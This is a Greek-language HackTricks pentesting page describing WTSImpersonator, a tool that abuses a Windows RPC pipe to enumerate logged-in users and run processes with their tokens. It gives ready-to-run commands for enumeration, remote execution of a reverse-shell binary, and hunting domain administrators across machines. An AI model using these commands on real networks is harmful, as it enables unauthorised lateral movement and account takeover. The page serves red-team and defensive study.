<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

Το εργαλείο **WTS Impersonator** εκμεταλλεύεται τον ονομασμένο αγωγό RPC **"\\pipe\LSM_API_service"** για να απαριθμήσει αθέμιτα τους συνδεδεμένους χρήστες και να κλέψει τα διαπιστευτήριά τους, παρακάμπτοντας τις παραδοσιακές τεχνικές υποκλοπής διαπιστευτηρίων. Αυτή η προσέγγιση διευκολύνει την άθροιση κινήσεων εντός δικτύων. Η καινοτομία πίσω από αυτήν την τεχνική αποδίδεται στον **Omri Baso, του οποίου το έργο είναι προσβάσιμο στο [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.

### Βασική Λειτουργικότητα
Το εργαλείο λειτουργεί μέσω μιας ακολουθίας κλήσεων API:
```powershell
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Κύρια Αρθρώματα και Χρήση
- **Απαρίθμηση Χρηστών**: Είναι δυνατή η τοπική και απομακρυσμένη απαρίθμηση χρηστών με το εργαλείο, χρησιμοποιώντας εντολές για κάθε περίπτωση:
- Τοπικά:
```powershell
.\WTSImpersonator.exe -m enum
```
- Απομακρυσμένα, με την καθορισμένη διεύθυνση IP ή το όνομα κεντρικού υπολογιστή:
```powershell
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Εκτέλεση Εντολών**: Τα αρθρώματα `exec` και `exec-remote` απαιτούν ένα πλαίσιο **Υπηρεσίας** για να λειτουργήσουν. Η τοπική εκτέλεση απλώς χρειάζεται το εκτελέσιμο WTSImpersonator και μια εντολή:
- Παράδειγμα για την τοπική εκτέλεση εντολής:
```powershell
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- Το PsExec64.exe μπορεί να χρησιμοποιηθεί για την απόκτηση ενός πλαισίου υπηρεσίας:
```powershell
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Απομακρυσμένη Εκτέλεση Εντολών**: Περιλαμβάνει τη δημιουργία και εγκατάσταση μιας υπηρεσίας απομακρυσμένα, παρόμοια με το PsExec.exe, επιτρέποντας την εκτέλεση με τα κατάλληλα δικαιώματα.
- Παράδειγμα απομακρυσμένης εκτέλεσης:
```powershell
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **Αρθρώματα Κυνηγού Χρηστών**: Στοχεύει συγκεκριμένους χρήστες σε πολλές μηχανές, εκτελώντας κώδικα με τα διαπιστευτήριά τους. Αυτό είναι ιδιαίτερα χρήσιμο για την επίθεση σε Διαχειριστές Τομέα με τοπικά δικαιώματα διαχειριστή σε αρκετά συστήματα.
- Παράδειγμα χρήσης:
```powershell
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```


<details>

<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Συμμετάσχετε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα κόλπα σας στο hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
